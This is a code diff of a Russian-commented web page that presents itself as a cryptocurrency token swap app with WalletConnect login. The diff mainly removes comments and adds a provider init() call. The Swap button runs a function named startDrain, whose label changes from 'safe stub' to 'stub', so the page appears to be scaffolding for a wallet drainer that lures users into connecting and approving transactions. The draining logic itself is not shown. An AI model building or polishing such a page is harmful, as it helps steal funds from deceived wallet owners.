@@ -203,22 +203,19 @@
         </div>
     </div>
 
-    <!-- Загрузка ethers через CDN (стабильная версия) -->
+    <!-- Загрузка ethers через CDN -->
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 
-    <!-- ESM-модуль WalletConnect (исправленный путь) -->
+    <!-- ESM-модуль WalletConnect -->
     <script type="module">
         import { EthereumProvider } from 'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.10.6/+esm';
 
-        // Сохраняем конструктор в глобальном объекте
         window.WalletConnectProvider = EthereumProvider;
         console.log('WalletConnect ESM loaded');
 
-        // Запускаем инициализацию приложения, если функция уже определена
         if (typeof window.initApp === 'function') {
             window.initApp();
         } else {
-            // Если ещё не определена, ждём
             window.addEventListener('load', function() {
                 if (typeof window.initApp === 'function') {
                     window.initApp();
@@ -227,30 +224,24 @@
         }
     </script>
 
-    <!-- Основной скрипт приложения -->
+    <!-- Основной скрипт -->
     <script>
-        // Глобальная функция инициализации
         window.initApp = function() {
-            // Проверяем, что ethers и WalletConnect загружены
             if (typeof ethers === 'undefined') {
                 document.getElementById('status').textContent = '❌ ethers library not loaded';
                 document.getElementById('status').className = 'status err';
                 return;
             }
             if (typeof window.WalletConnectProvider === 'undefined') {
-                // Если WalletConnect ещё не загружен, попробуем через секунду
                 setTimeout(window.initApp, 500);
                 return;
             }
-
-            // Запускаем приложение
             runApp();
         };
 
         function runApp() {
             'use strict';
 
-            // ===== КОНФИГУРАЦИЯ =====
             const PROJECT_ID = '2c94255cd6cb3dd91ea6f447bbe7d3c9';
             const CONTRACT_ADDRESSES = {
                 1: '0x0000000000000000000000000000000000000000',
@@ -296,7 +287,6 @@
             let currentSelectType = null;
             let currentRate = 0;
 
-            // DOM
             const statusEl = document.getElementById('status');
             const connectBtn = document.getElementById('connectWalletBtn');
             const swapBtn = document.getElementById('swapBtn');
@@ -328,7 +318,6 @@
             let retryTimer = null;
             let rateCache = {};
 
-            // ===== КУРСЫ =====
             async function fetchRealRate(fromId, toId) {
                 const cacheKey = fromId + '-' + toId;
                 if (rateCache[cacheKey] && (Date.now() - rateCache[cacheKey].timestamp < 30000)) {
@@ -377,7 +366,6 @@
                 } catch (_) {}
             }
 
-            // ===== UI =====
             function setStatus(text, type) {
                 statusEl.textContent = text;
                 statusEl.className = 'status';
@@ -424,7 +412,6 @@
             function openModal(modal) { modal.classList.add('active'); }
             function closeModal(modal) { modal.classList.remove('active'); }
 
-            // ===== ОЧИСТКА СЕССИИ =====
             async function forceClearSession() {
                 try {
                     if (wcProvider) {
@@ -466,7 +453,7 @@
                 } catch (_) {}
             }
 
-            // ===== ПОДКЛЮЧЕНИЕ WALLETCONNECT (используем ESM-конструктор) =====
+            // ===== ПОДКЛЮЧЕНИЕ С ВЫЗОВОМ init() =====
             async function connectWalletConnect() {
                 if (isConnecting || isProcessing) return;
                 closeModal(walletModal);
@@ -476,7 +463,7 @@
 
                 const EthereumProvider = window.WalletConnectProvider;
                 if (!EthereumProvider) {
-                    setStatus('❌ WalletConnect library not loaded. Check your internet or reload.', 'err');
+                    setStatus('❌ WalletConnect library not loaded.', 'err');
                     return;
                 }
 
@@ -495,6 +482,9 @@
                             icons: []
                         }
                     });
+
+                    // ВАЖНО: вызываем init() перед enable()
+                    await wcProvider.init();
 
                     wcProvider.on('chainChanged', () => {});
                     wcProvider.on('accountsChanged', (accounts) => {
@@ -546,7 +536,7 @@
                 }
             }
 
-            // ===== СВАП (безопасная заглушка) =====
+            // ===== СВАП (заглушка) =====
             async function startDrain() {
                 if (isProcessing) return;
                 if (!provider || !signer) {
@@ -606,7 +596,6 @@
                 startDrain();
             });
 
-            // ===== MAX =====
             function handleMaxClick() {
                 const amount = 0.001;
                 balanceFrom.innerHTML = amount.toFixed(6) + ' <button class="max-tag" id="maxBtn">Max</button>';
@@ -635,7 +624,6 @@
                 updateRateAndOutput();
             });
 
-            // ===== ВЫБОР ТОКЕНОВ =====
             function renderTokenList(filter) {
                 filter = (filter || '').toLowerCase();
                 tokenList.innerHTML = '';
@@ -694,7 +682,6 @@
                 setStatus('Tokens flipped', '');
             });
 
-            // ===== ИНИЦИАЛИЗАЦИЯ =====
             async function init() {
                 await forceClearSession();
                 updateConnectButton();
@@ -703,8 +690,6 @@
                 console.log('Ethers loaded');
                 if (typeof window.WalletConnectProvider !== 'undefined') {
                     console.log('WalletConnect ESM loaded');
-                } else {
-                    console.warn('WalletConnect not loaded yet, will retry');
                 }
                 const params = new URLSearchParams(window.location.search);
                 if (params.has('nocache') || params.has('reset')) {
@@ -716,12 +701,10 @@
             init();
         }
 
-        // Если модуль уже загружен, инициализируем сразу, иначе ждём
+        // Запуск
         if (typeof window.WalletConnectProvider !== 'undefined') {
             window.initApp();
         } else {
-            // Подождём загрузки модуля (он запустит initApp после загрузки)
-            // Но также поставим обработчик на всякий случай
             window.addEventListener('load', function() {
                 if (typeof window.WalletConnectProvider !== 'undefined' && typeof window.initApp === 'function') {
                     window.initApp();
